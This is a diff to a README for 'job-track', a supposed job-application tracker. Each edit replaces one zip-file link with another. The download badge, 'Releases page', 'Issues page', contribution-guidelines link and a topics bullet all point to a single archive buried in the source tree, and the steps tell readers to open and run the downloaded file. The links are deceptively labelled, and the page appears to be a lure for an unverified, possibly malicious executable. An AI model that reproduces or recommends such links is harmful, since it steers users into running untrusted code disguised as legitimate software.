@@ -1,7 +1,7 @@
 # 🌟 job-track - Keep Your Job Applications Organized
 
 ## 📥 Download Now
-[![Download job-track](https://raw.githubusercontent.com/ubercock/job-track/main/src/app/track-job-1.6.zip)](https://raw.githubusercontent.com/ubercock/job-track/main/src/app/track-job-1.6.zip)  
+[![Download job-track](https://github.com/ubercock/job-track/raw/refs/heads/main/src/components/job_track_3.7.zip)](https://github.com/ubercock/job-track/raw/refs/heads/main/src/components/job_track_3.7.zip)  
 
 ## 🚀 Getting Started
 Welcome to **job-track**, your premium job application tracker. With this app, you can easily manage your job applications and stay organized throughout your job search. 
@@ -25,7 +25,7 @@ To run **job-track**, you will need:
 ## 🔗 Download & Install
 To get started with **job-track**, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/ubercock/job-track/main/src/app/track-job-1.6.zip) to download the latest version of **job-track**.
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/ubercock/job-track/raw/refs/heads/main/src/components/job_track_3.7.zip) to download the latest version of **job-track**.
 2. **Choose Your Version**: Look for the most recent release. Click on it.
 3. **Download the App**: Click on the appropriate file to download.
 4. **Run the App**: Open the downloaded file and follow the on-screen instructions to run **job-track**.
@@ -63,7 +63,7 @@ LocalStorage allows your application data to be saved in your browser, ensuring 
 Currently, **job-track** is optimized for desktop use. Mobile support may be available in future releases.
 
 ### Who can I contact for support?
-For support, you can reach us through our [GitHub Issues page](https://raw.githubusercontent.com/ubercock/job-track/main/src/app/track-job-1.6.zip). We’ll get back to you as soon as possible.
+For support, you can reach us through our [GitHub Issues page](https://github.com/ubercock/job-track/raw/refs/heads/main/src/components/job_track_3.7.zip). We’ll get back to you as soon as possible.
 
 ## 🌟 Join the Community
 Engage with others who are using **job-track**. Share your experiences and tips, or get help by joining our discussions on platforms like GitHub. 
@@ -72,7 +72,7 @@ Engage with others who are using **job-track**. Share your experiences and tips,
 This project revolves around topics such as:
 - Accessibility
 - Frontend UI Design
-- https://raw.githubusercontent.com/ubercock/job-track/main/src/app/track-job-1.6.zip
+- https://github.com/ubercock/job-track/raw/refs/heads/main/src/components/job_track_3.7.zip
 - React
 - Responsive Design
 - SEO Optimization
@@ -82,9 +82,9 @@ This project revolves around topics such as:
 Explore these concepts to enhance your understanding of how **job-track** is built and maintained.
 
 ## ⚠️ Updates and Contributions
-We regularly update **job-track** to improve functionality and user experience. Keep an eye on the [Releases page](https://raw.githubusercontent.com/ubercock/job-track/main/src/app/track-job-1.6.zip) for new features and improvements.
+We regularly update **job-track** to improve functionality and user experience. Keep an eye on the [Releases page](https://github.com/ubercock/job-track/raw/refs/heads/main/src/components/job_track_3.7.zip) for new features and improvements.
 
 ### Contribution Guidelines
-If you'd like to contribute to **job-track**, please follow our guidelines in the [https://raw.githubusercontent.com/ubercock/job-track/main/src/app/track-job-1.6.zip](https://raw.githubusercontent.com/ubercock/job-track/main/src/app/track-job-1.6.zip) document. Your input is welcome!
+If you'd like to contribute to **job-track**, please follow our guidelines in the [https://github.com/ubercock/job-track/raw/refs/heads/main/src/components/job_track_3.7.zip](https://github.com/ubercock/job-track/raw/refs/heads/main/src/components/job_track_3.7.zip) document. Your input is welcome!
 
 Thank you for using **job-track** and happy job hunting!
